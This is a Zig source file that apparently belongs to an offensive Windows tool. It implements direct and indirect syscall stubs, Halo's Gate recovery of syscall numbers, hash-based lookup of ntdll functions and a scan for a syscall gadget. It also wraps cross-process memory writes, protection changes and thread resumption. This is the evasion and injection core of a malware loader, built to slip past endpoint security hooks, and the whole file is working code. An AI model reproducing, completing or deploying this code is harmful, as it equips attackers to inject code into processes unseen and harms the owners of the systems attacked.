const std = @import("std");
const obf = @import("obf.zig");
const api = @import("api.zig");
const win = @import("win32.zig");

// Private Nt* syscall stubs.  The service number is read from ntdll, then a
// small executable stub is built in private memory:
//
//   direct:   mov r10, rcx ; mov eax, ssn ; syscall ; ret
//   indirect: mov r10, rcx ; mov eax, ssn ; jmp [rip+0] -> ntdll syscall;ret
//
// A self test performs an allocate/write/protect/free round trip.  If it does
// not pass, every wrapper below falls back to the normal Win32/NT export.

const NX_NT_SUCCESS: i32 = 0;
const NX_STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004;
const NX_STUB_PAGE_SIZE: usize = 0x1000;
const NX_GADGET_SCAN_LIMIT: usize = 0x400000;

const NtAllocateVirtualMemoryFn = *const fn (
    win.HANDLE,
    *?*anyopaque,
    usize,
    *usize,
    u32,
    u32,
) callconv(.winapi) i32;

const NtFreeVirtualMemoryFn = *const fn (
    win.HANDLE,
    *?*anyopaque,
    *usize,
    u32,
) callconv(.winapi) i32;

const NtProtectVirtualMemoryFn = *const fn (
    win.HANDLE,
    *?*anyopaque,
    *usize,
    u32,
    *u32,
) callconv(.winapi) i32;

const NtWriteVirtualMemoryFn = *const fn (
    win.HANDLE,
    ?*anyopaque,
    ?*const anyopaque,
    usize,
    ?*usize,
) callconv(.winapi) i32;

const NtReadVirtualMemoryFn = *const fn (
    win.HANDLE,
    ?*anyopaque,
    ?*anyopaque,
    usize,
    ?*usize,
) callconv(.winapi) i32;

const NtResumeThreadFn = *const fn (win.HANDLE, ?*u32) callconv(.winapi) i32;
const NtDelayExecutionFn = *const fn (win.BOOL, *i64) callconv(.winapi) i32;
const NtCloseFn = *const fn (win.HANDLE) callconv(.winapi) i32;

const NtQueryInformationProcessFn = *const fn (
    win.HANDLE,
    u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) i32;

const NtQueryInformationThreadFn = *const fn (
    win.HANDLE,
    u32,
    ?*anyopaque,
    u32,
    ?*u32,
) callconv(.winapi) i32;

const NxStub = enum(u8) {
    alloc,
    free,
    protect,
    write,
    read_memory,
    resume_thread,
    delay,
    close,
    query_process,
    query_thread,
};

const nx_stub_count = @typeInfo(NxStub).@"enum".field_names.len;

var nx_stub_page: ?[*]u8 = null;
var nx_stub_offset: usize = 0;
var nx_stubs: [nx_stub_count]?*anyopaque = @splat(null);
var nx_state: enum { uninitialised, ready, disabled } = .uninitialised;
var nx_requested_mode: u8 = 0;

fn nx_peek_u16(ptr: [*]const u8, offset: usize) ?u16 {
    return std.mem.readInt(u16, ptr[offset..][0..2], .little);
}

fn nx_peek_u32(ptr: [*]const u8, offset: usize) ?u32 {
    return std.mem.readInt(u32, ptr[offset..][0..4], .little);
}

const NxImageInfo = struct {
    base: usize,
    image_size: usize,
    text_start: usize,
    text_end: usize,
};

fn nx_module_info(module: win.HMODULE) ?NxImageInfo {
    const base: [*]const u8 = @ptrFromInt(@intFromPtr(module));
    if (base[0] != 'M' or base[1] != 'Z') return null;
    const lfanew = nx_peek_u32(base, 0x3C) orelse return null;
    const nt = @as(usize, lfanew);
    if (nx_peek_u32(base, nt) != 0x00004550) return null;
    const section_count = nx_peek_u16(base, nt + 6) orelse return null;
    const optional_size = nx_peek_u16(base, nt + 20) orelse return null;
    const optional = nt + 24;
    const image_size = nx_peek_u32(base, optional + 56) orelse return null;
    const sections = optional + @as(usize, optional_size);

    var index: usize = 0;
    while (index < section_count) : (index += 1) {
        const header = sections + index * 40;
        const name = base[header .. header + 8];
        if (!std.mem.startsWith(u8, name, ".text")) continue;
        const virtual_size = nx_peek_u32(base, header + 8) orelse return null;
        const virtual_address = nx_peek_u32(base, header + 12) orelse return null;
        const raw_size = nx_peek_u32(base, header + 16) orelse return null;
        const size = if (virtual_size != 0) virtual_size else raw_size;
        const start = @intFromPtr(module) + virtual_address;
        return .{
            .base = @intFromPtr(module),
            .image_size = image_size,
            .text_start = start,
            .text_end = start + size,
        };
    }
    return null;
}

fn nx_stub_ssn(stub: [*]const u8) ?u32 {
    if (stub[0] != 0x4C or stub[1] != 0x8B or stub[2] != 0xD1 or stub[3] != 0xB8)
        return null;
    return std.mem.readInt(u32, stub[4..8], .little);
}

fn nx_function(function_hash: u32) ?[*]const u8 {
    return @ptrCast(api.nx_api(0xD432B36D, function_hash));
}

fn nx_ssn_for(function_hash: u32) u32 {
    const function = nx_function(function_hash) orelse return 0;
    if (nx_stub_ssn(function)) |ssn| return ssn;

    const ntdll = api.nx_module(0xD432B36D) orelse return 0;
    const info = nx_module_info(ntdll) orelse return 0;
    const address = @intFromPtr(function);

    // Halo's Gate: x64 stubs are 0x20 bytes apart.  Walk in both directions
    // until an intact stub is found and derive the service number from the
    // distance.
    var distance: usize = 1;
    while (distance < 400) : (distance += 1) {
        const step = distance * 0x20;
        if (address >= info.base + step and address - step + 8 <= info.base + info.image_size) {
            const lower: [*]const u8 = @ptrFromInt(address - step);
            if (nx_stub_ssn(lower)) |ssn| return ssn + @as(u32, @intCast(distance));
        }
        if (address + step + 8 <= info.base + info.image_size) {
            const upper: [*]const u8 = @ptrFromInt(address + step);
            if (nx_stub_ssn(upper)) |ssn| {
                if (ssn >= distance) return ssn - @as(u32, @intCast(distance));
            }
        }
    }
    return 0;
}

fn nx_syscall_gadget() ?[*]const u8 {
    const ntdll = api.nx_module(0xD432B36D) orelse return null;
    const info = nx_module_info(ntdll) orelse return null;
    const start: [*]const u8 = @ptrFromInt(info.text_start);
    const length = @min(info.text_end - info.text_start, NX_GADGET_SCAN_LIMIT);
    var offset: usize = 0;
    while (offset + 2 < length) : (offset += 1) {
        if (start[offset] == 0x0F and start[offset + 1] == 0x05 and start[offset + 2] == 0xC3)
            return start + offset;
    }
    return null;
}

fn nx_build_stub(ssn: u32, indirect: bool) ?*anyopaque {
    if (nx_stub_page == null) {
        nx_stub_page = @ptrCast(win.VirtualAlloc(
            null,
            NX_STUB_PAGE_SIZE,
            win.MEM_COMMIT | win.MEM_RESERVE,
            win.PAGE_READWRITE,
        ) orelse return null);
    }
    const page = nx_stub_page.?;
    var code: [24]u8 = @splat(0);
    var length: usize = 0;

    code[length] = 0x4C;
    length += 1;
    code[length] = 0x8B;
    length += 1;
    code[length] = 0xD1;
    length += 1;
    code[length] = 0xB8;
    length += 1;
    std.mem.writeInt(u32, code[length..][0..4], ssn, .little);
    length += 4;

    if (indirect) {
        const gadget = nx_syscall_gadget() orelse return null;
        code[length] = 0xFF;
        length += 1;
        code[length] = 0x25;
        length += 1;
        code[length] = 0x00;
        length += 1;
        code[length] = 0x00;
        length += 1;
        code[length] = 0x00;
        length += 1;
        code[length] = 0x00;
        length += 1;
        std.mem.writeInt(usize, code[length..][0..8], @intFromPtr(gadget), .little);
        length += 8;
    } else {
        code[length] = 0x0F;
        length += 1;
        code[length] = 0x05;
        length += 1;
        code[length] = 0xC3;
        length += 1;
    }

    if (nx_stub_offset + length > NX_STUB_PAGE_SIZE) return null;
    const stub = page + nx_stub_offset;
    @memcpy(stub[0..length], code[0..length]);
    nx_stub_offset += length;
    return @ptrCast(stub);
}

fn nx_stub(kind: NxStub) ?*anyopaque {
    return nx_stubs[@backingInt(kind)];
}

fn nx_lookup(function_hash: u32) ?*anyopaque {
    const ssn = nx_ssn_for(function_hash);
    if (ssn == 0) return null;
    const indirect = nx_requested_mode == 2;
    if (nx_build_stub(ssn, indirect)) |stub| return stub;
    if (indirect) return nx_build_stub(ssn, false);
    return null;
}

fn nx_call_alloc(
    process: win.HANDLE,
    address: ?*anyopaque,
    size: usize,
    allocation_type: u32,
    protect: u32,
) ?*anyopaque {
    const stub = nx_stub(.alloc) orelse return null;
    const function: NtAllocateVirtualMemoryFn = @ptrCast(@alignCast(stub));
    var base: ?*anyopaque = address;
    var region_size = size;
    const status = function(process, &base, 0, &region_size, allocation_type, protect);
    if (status != NX_NT_SUCCESS or base == null) return null;
    return base;
}

fn nx_call_free(process: win.HANDLE, address: ?*anyopaque, size: usize, free_type: u32) bool {
    const stub = nx_stub(.free) orelse return false;
    const function: NtFreeVirtualMemoryFn = @ptrCast(@alignCast(stub));
    var base = address;
    var region_size = size;
    return function(process, &base, &region_size, free_type) == NX_NT_SUCCESS;
}

fn nx_call_protect(
    process: win.HANDLE,
    address: ?*anyopaque,
    size: usize,
    protect: u32,
    old_protect: ?*u32,
) bool {
    const stub = nx_stub(.protect) orelse return false;
    const function: NtProtectVirtualMemoryFn = @ptrCast(@alignCast(stub));
    var base = address;
    var region_size = size;
    var old: u32 = 0;
    const status = function(process, &base, &region_size, protect, &old);
    if (old_protect) |value| value.* = old;
    return status == NX_NT_SUCCESS;
}

fn nx_call_write(
    process: win.HANDLE,
    address: ?*anyopaque,
    buffer: ?*const anyopaque,
    size: usize,
) bool {
    const stub = nx_stub(.write) orelse return false;
    const function: NtWriteVirtualMemoryFn = @ptrCast(@alignCast(stub));
    var written: usize = 0;
    return function(process, address, buffer, size, &written) == NX_NT_SUCCESS and written == size;
}

fn nx_call_read(
    process: win.HANDLE,
    address: ?*anyopaque,
    buffer: ?*anyopaque,
    size: usize,
) bool {
    const stub = nx_stub(.read_memory) orelse return false;
    const function: NtReadVirtualMemoryFn = @ptrCast(@alignCast(stub));
    var read: usize = 0;
    return function(process, address, buffer, size, &read) == NX_NT_SUCCESS and read == size;
}

fn nx_call_resume(thread: win.HANDLE) bool {
    const stub = nx_stub(.resume_thread) orelse return false;
    const function: NtResumeThreadFn = @ptrCast(@alignCast(stub));
    return function(thread, null) == NX_NT_SUCCESS;
}

fn nx_selftest() bool {
    const process = win.GetCurrentProcess();
    const base = nx_call_alloc(
        process,
        null,
        0x1000,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_READWRITE,
    ) orelse return false;

    const marker: u32 = 0x4E4F4D44; // "DMON"
    if (!nx_call_write(process, base, &marker, @sizeOf(u32))) {
        _ = nx_call_free(process, base, 0, win.MEM_RELEASE);
        return false;
    }
    const pointer: *volatile u32 = @ptrCast(@alignCast(base));
    if (pointer.* != marker) {
        _ = nx_call_free(process, base, 0, win.MEM_RELEASE);
        return false;
    }
    if (!nx_call_protect(process, base, 0x1000, win.PAGE_READONLY, null)) {
        _ = nx_call_free(process, base, 0, win.MEM_RELEASE);
        return false;
    }
    return nx_call_free(process, base, 0, win.MEM_RELEASE);
}

pub fn nx_init(use_direct_syscalls: bool, mode: []const u8) void {
    if (nx_state != .uninitialised) return;
    nx_state = .disabled;
    if (!use_direct_syscalls) return;
    nx_requested_mode = if (obf.eq(mode, "direct")) 1 else if (obf.eq(mode, "indirect")) 2 else 0;
    if (nx_requested_mode == 0) return;

    nx_stubs[@backingInt(NxStub.alloc)] = nx_lookup(0x50996836);
    nx_stubs[@backingInt(NxStub.free)] = nx_lookup(0x92A06053);
    nx_stubs[@backingInt(NxStub.protect)] = nx_lookup(0xE7011692);
    nx_stubs[@backingInt(NxStub.write)] = nx_lookup(0x8167E51C);
    nx_stubs[@backingInt(NxStub.read_memory)] = nx_lookup(0x0DC61B4D);
    nx_stubs[@backingInt(NxStub.resume_thread)] = nx_lookup(0x324347DA);
    nx_stubs[@backingInt(NxStub.delay)] = nx_lookup(0xA991E534);
    nx_stubs[@backingInt(NxStub.close)] = nx_lookup(0xAB9B41E7);
    nx_stubs[@backingInt(NxStub.query_process)] = nx_lookup(0x821B078C);
    nx_stubs[@backingInt(NxStub.query_thread)] = nx_lookup(0x716BDEA5);

    if (nx_stub_page) |page| {
        var old: u32 = 0;
        _ = win.VirtualProtect(page, NX_STUB_PAGE_SIZE, win.PAGE_EXECUTE_READ, &old);
    }
    if (nx_selftest()) nx_state = .ready;
}

pub fn nx_enabled() bool {
    return nx_state == .ready;
}

pub fn nx_alloc(
    process: win.HANDLE,
    address: ?*anyopaque,
    size: usize,
    allocation_type: u32,
    protect: u32,
) ?*anyopaque {
    if (nx_state == .ready) {
        if (nx_call_alloc(process, address, size, allocation_type, protect)) |memory| return memory;
    }
    if (nx_nt_alloc(process, address, size, allocation_type, protect)) |memory| return memory;
    return win.VirtualAllocEx(
        process,
        address,
        size,
        allocation_type,
        protect,
    );
}

pub fn nx_free(process: win.HANDLE, address: ?*anyopaque, size: usize, free_type: u32) bool {
    if (nx_state == .ready and nx_call_free(process, address, size, free_type)) return true;
    if (nx_nt_free(process, address, size, free_type)) return true;
    if (free_type == win.MEM_RELEASE) return win.VirtualFreeEx(process, address, 0, free_type).toBool();
    return win.VirtualFreeEx(process, address, size, free_type).toBool();
}

pub fn nx_protect(
    process: win.HANDLE,
    address: ?*anyopaque,
    size: usize,
    protect: u32,
    old_protect: ?*u32,
) bool {
    if (nx_state == .ready and nx_call_protect(process, address, size, protect, old_protect)) return true;
    if (nx_nt_protect(process, address, size, protect, old_protect)) return true;
    var old: u32 = 0;
    const result = win.VirtualProtectEx(
        process,
        address,
        size,
        protect,
        if (old_protect) |value| value else &old,
    ).toBool();
    return result;
}

pub fn nx_write(
    process: win.HANDLE,
    address: ?*anyopaque,
    buffer: *const anyopaque,
    size: usize,
) bool {
    if (nx_state == .ready and nx_call_write(process, address, buffer, size)) return true;
    if (nx_nt_write(process, address, buffer, size)) return true;
    return win.WriteProcessMemory(process, address, buffer, size, null).toBool();
}

pub fn nx_read(
    process: win.HANDLE,
    address: ?*anyopaque,
    buffer: *anyopaque,
    size: usize,
) bool {
    if (nx_state == .ready and nx_call_read(process, address, buffer, size)) return true;
    if (nx_nt_read(process, address, buffer, size)) return true;
    return win.ReadProcessMemory(process, address, buffer, size, null).toBool();
}

pub fn nx_resume(thread: win.HANDLE) bool {
    if (nx_state == .ready and nx_call_resume(thread)) return true;
    if (nx_nt_resume(thread)) return true;
    return win.ResumeThread(thread) != 0xFFFFFFFF;
}

fn nx_nt_resolve(function_hash: u32) ?*anyopaque {
    return api.nx_api(0xD432B36D, function_hash);
}

fn nx_nt_alloc(process: win.HANDLE, address: ?*anyopaque, size: usize, allocation_type: u32, protect: u32) ?*anyopaque {
    const pointer = nx_nt_resolve(0x50996836) orelse return null;
    const function: NtAllocateVirtualMemoryFn = @ptrCast(@alignCast(pointer));
    var base: ?*anyopaque = address;
    var region_size = size;
    return if (function(process, &base, 0, &region_size, allocation_type, protect) == NX_NT_SUCCESS)
        base
    else
        null;
}

fn nx_nt_free(process: win.HANDLE, address: ?*anyopaque, size: usize, free_type: u32) bool {
    const pointer = nx_nt_resolve(0x92A06053) orelse return false;
    const function: NtFreeVirtualMemoryFn = @ptrCast(@alignCast(pointer));
    var base = address;
    var region_size = size;
    return function(process, &base, &region_size, free_type) == NX_NT_SUCCESS;
}

fn nx_nt_protect(process: win.HANDLE, address: ?*anyopaque, size: usize, protect: u32, old_protect: ?*u32) bool {
    const pointer = nx_nt_resolve(0xE7011692) orelse return false;
    const function: NtProtectVirtualMemoryFn = @ptrCast(@alignCast(pointer));
    var base = address;
    var region_size = size;
    var old: u32 = 0;
    const status = function(process, &base, &region_size, protect, &old);
    if (old_protect) |value| value.* = old;
    return status == NX_NT_SUCCESS;
}

fn nx_nt_write(process: win.HANDLE, address: ?*anyopaque, buffer: *const anyopaque, size: usize) bool {
    const pointer = nx_nt_resolve(0x8167E51C) orelse return false;
    const function: NtWriteVirtualMemoryFn = @ptrCast(@alignCast(pointer));
    var written: usize = 0;
    return function(process, address, buffer, size, &written) == NX_NT_SUCCESS and written == size;
}

fn nx_nt_read(process: win.HANDLE, address: ?*anyopaque, buffer: *anyopaque, size: usize) bool {
    const pointer = nx_nt_resolve(0x0DC61B4D) orelse return false;
    const function: NtReadVirtualMemoryFn = @ptrCast(@alignCast(pointer));
    var read: usize = 0;
    return function(process, address, buffer, size, &read) == NX_NT_SUCCESS and read == size;
}

fn nx_nt_resume(thread: win.HANDLE) bool {
    const pointer = nx_nt_resolve(0x324347DA) orelse return false;
    const function: NtResumeThreadFn = @ptrCast(@alignCast(pointer));
    return function(thread, null) == NX_NT_SUCCESS;
}

pub fn nx_delay(milliseconds: u64) void {
    if (milliseconds == 0) return;
    var interval: i64 = -@as(i64, @intCast(@min(milliseconds, std.math.maxInt(i64) / 10_000) * 10_000));
    if (nx_state == .ready) {
        if (nx_stub(.delay)) |stub| {
            const function: NtDelayExecutionFn = @ptrCast(@alignCast(stub));
            _ = function(win.BOOL.FALSE, &interval);
            return;
        }
    }
    if (nx_nt_resolve(0xA991E534)) |pointer| {
        const function: NtDelayExecutionFn = @ptrCast(@alignCast(pointer));
        _ = function(win.BOOL.FALSE, &interval);
        return;
    }
    win.Sleep(@intCast(@min(milliseconds, std.math.maxInt(u32))));
}

pub fn nx_close(handle: win.HANDLE) void {
    if (nx_state == .ready) {
        if (nx_stub(.close)) |stub| {
            const function: NtCloseFn = @ptrCast(@alignCast(stub));
            _ = function(handle);
            return;
        }
    }
    if (nx_nt_resolve(0xAB9B41E7)) |pointer| {
        const function: NtCloseFn = @ptrCast(@alignCast(pointer));
        _ = function(handle);
        return;
    }
    _ = win.CloseHandle(handle);
}

pub fn nx_query_process(
    process: win.HANDLE,
    info_class: u32,
    buffer: ?*anyopaque,
    size: u32,
    returned: ?*u32,
) i32 {
    if (nx_state == .ready) {
        if (nx_stub(.query_process)) |stub| {
            const function: NtQueryInformationProcessFn = @ptrCast(@alignCast(stub));
            return function(process, info_class, buffer, size, returned);
        }
    }
    const pointer = nx_nt_resolve(0x821B078C) orelse return -1;
    const function: NtQueryInformationProcessFn = @ptrCast(@alignCast(pointer));
    return function(process, info_class, buffer, size, returned);
}

pub fn nx_query_thread(
    thread: win.HANDLE,
    info_class: u32,
    buffer: ?*anyopaque,
    size: u32,
    returned: ?*u32,
) i32 {
    if (nx_state == .ready) {
        if (nx_stub(.query_thread)) |stub| {
            const function: NtQueryInformationThreadFn = @ptrCast(@alignCast(stub));
            return function(thread, info_class, buffer, size, returned);
        }
    }
    const pointer = nx_nt_resolve(0x716BDEA5) orelse return -1;
    const function: NtQueryInformationThreadFn = @ptrCast(@alignCast(pointer));
    return function(thread, info_class, buffer, size, returned);
}
